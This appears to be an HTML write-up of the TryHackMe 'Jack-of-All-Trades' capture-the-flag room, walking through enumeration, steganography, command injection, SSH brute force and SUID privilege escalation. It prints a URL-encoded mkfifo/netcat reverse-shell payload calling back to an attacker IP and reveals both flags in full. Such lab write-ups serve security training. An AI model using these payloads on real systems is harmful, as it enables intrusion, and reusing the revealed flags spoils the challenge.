@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jack of All Trades Walkthrough | R3dex Writeups</title>
+    <style>
+        body { 
+            background: #0d1117; 
+            color: #e6edf3; 
+            font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, sans-serif; 
+            padding: 4rem 2rem; 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            line-height: 1.6; 
+        }
+        h1 { color: #ffffff; font-size: 2.2rem; margin-bottom: 1.5rem; font-weight: 400; }
+        h3 { color: #ffffff; border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; margin-top: 3rem; margin-bottom: 1.5rem; font-size: 1.3rem; font-weight: 400; }
+        h4 { color: #ffffff; font-size: 1.1rem; font-weight: 400; margin-top: 2rem; margin-bottom: 1rem; }
+        a { color: #4493f8; text-decoration: none; transition: 0.2s; }
+        a:hover { text-decoration: underline; }
+        .back-link { display: inline-block; margin-bottom: 3rem; color: #8b949e; font-size: 0.9rem; }
+        .back-link::before { content: '← '; }
+        .content { margin-top: 2rem; }
+        code { background: rgba(110, 118, 129, 0.2); padding: 0.2rem 0.4rem; border-radius: 6px; font-family: 'IBM Plex Mono', monospace; color: #e6edf3; font-size: 0.9em; }
+        pre { 
+            background: #161b22; 
+            padding: 1.2rem; 
+            border-radius: 6px; 
+            overflow-x: auto; 
+            font-family: 'IBM Plex Mono', monospace; 
+            border: 1px solid #30363d; 
+            margin: 1.5rem 0; 
+            color: #e6edf3;
+            font-size: 0.9rem;
+        }
+        ul, ol { margin-bottom: 1.5rem; padding-left: 1.5rem; }
+        li { margin-bottom: 0.5rem; }
+        p { margin-bottom: 1.2rem; }
+        hr { border: 0; border-top: 1px solid #30363d; margin: 3rem 0; }
+        .hero-banner { 
+            width: 100%; 
+            max-height: 500px; 
+            object-fit: contain; 
+            margin-bottom: 2.5rem; 
+            background: transparent;
+        }
+        strong { font-weight: 400; color: #ffffff; }
+    </style>
+</head>
+<body>
+    <a href="../index.html" class="back-link">Back to Writeups</a>
+    
+    <div class="content">
+        <!-- Assuming the user places the image here, referencing assets as per prior pattern -->
+        <img src="../assets/jack_of_all_trades.png" alt="Jack of All Trades Banner" class="hero-banner">
+        <h1>TryHackMe - Jack-of-All-Trades Write-Up</h1>
+        
+        <p><strong>📌 Room Context</strong></p>
+        <ul>
+            <li>Difficulty: Medium</li>
+            <li>Style: Boot-to-Root</li>
+            <li>Original Event: <strong>Securi-Tay 2020</strong></li>
+            <li>Skills Tested: Enumeration, encoding/decoding, steganography, brute-forcing, reverse shells, privilege escalation</li>
+            <li>Author: Karthik</li>
+        </ul>
+
+        <hr>
+
+        <h3>🔎 1. Enumeration</h3>
+        
+        <h4>Nmap Scan</h4>
+        <pre>nmap -sV ip</pre>
+        <p>Results:</p>
+        <ul>
+            <li>Port 22/tcp → Apache (HTTP)</li>
+            <li>Port 80/tcp → OpenSSH</li>
+        </ul>
+        <p>👉 Services swapped: web runs on port 22, SSH on port 80.</p>
+        
+        <h4>Accessing Web Service</h4>
+        <p>Firefox blocks HTTP on port 22.<br>
+        Fix:</p>
+        <ol>
+            <li>Go to <code>about:config</code>.</li>
+            <li>Add <code>22</code> to <code>network.security.ports.banned.override</code>.</li>
+            <li>Visit:</li>
+        </ol>
+        <pre>http://10.10.115.169:22</pre>
+
+        <hr>
+
+        <h3>2. Web Enumeration</h3>
+        <p>Source code → <code>/recovery.php</code>.</p>
+        <p>Contains encoded hints: Base32 → Hex → ROT13 and Base64.</p>
+        <p>Reveal:</p>
+        <ul>
+            <li>Password clue.</li>
+            <li>Credentials hidden in <code>header.jpg</code>.</li>
+        </ul>
+
+        <hr>
+
+        <h3>3. Steganography</h3>
+        <p>Download image:</p>
+        <pre>wget http://10.10.115.169:22/header.jpg</pre>
+        <p>Extract hidden file:</p>
+        <pre>steghide extract -sf header.jpg</pre>
+        <p>Found <code>cms.creds</code> with username &amp; password.</p>
+
+        <hr>
+
+        <h3>💻 4. Initial Foothold</h3>
+        <p>Login at <code>/recovery.php</code>.<br>
+        Discovered command injection at <code>?cmd=</code>.</p>
+        <p>Test:</p>
+        <pre>http://10.10.115.169:22/nnxhweOV/?cmd=id</pre>
+
+        <hr>
+
+        <h3>5. Reverse Shell</h3>
+        <p>Start listener:</p>
+        <pre>nc -lvnp 4444</pre>
+        <p>Payload (URL-encoded):</p>
+        <pre>http://10.10.115.169:22/nnxhweOV/?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.9.0.185%204444%20&gt;%20/tmp/f</pre>
+        <p>Got shell → upgraded with:</p>
+        <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+
+        <hr>
+
+        <h3>6. User Flag</h3>
+        <p>Found password list in <code>/home/jack/</code>.<br>
+        Brute-forced SSH on port 80:</p>
+        <pre>hydra -l jack -P passwords.txt ssh://10.10.115.169:80</pre>
+        <p>Logged in → user flag inside <code>user.jpg</code>:</p>
+        <p>move user.jpg to your machine</p>
+        <pre>flag: securi-tay2020_{********************}</pre>
+
+        <hr>
+
+        <h3>7. Root Flag</h3>
+        <p>Check SUID binaries:</p>
+        <pre>find / -perm -4000 -type f 2&gt;/dev/null</pre>
+        <p>Found <code>/usr/bin/strings</code>.<br>
+        Read root flag:</p>
+        <pre>strings /root/root.txt</pre>
+        <p>Root flag:</p>
+        <pre>securi-tay2020_{*****************}</pre>
+
+        <hr>
+
+        <h3>🎯 8. Summary</h3>
+        <ul>
+            <li><strong>Enumeration</strong>: Odd ports → HTTP on 22, SSH on 80.</li>
+            <li><strong>Exploitation</strong>: Encoded hints, stego, CMS creds.</li>
+            <li><strong>Foothold</strong>: Command injection → reverse shell.</li>
+            <li><strong>User</strong>: Hydra brute-force SSH.</li>
+            <li><strong>Root</strong>: Abused SUID strings.</li>
+        </ul>
+        
+        <h4>Flags</h4>
+        <ul>
+            <li><strong>User</strong>: securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}</li>
+            <li><strong>Root</strong>: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}</li>
+        </ul>
+        <p>Challenge complete — machine fully compromised.</p>
+    </div>
+</body>
+</html>
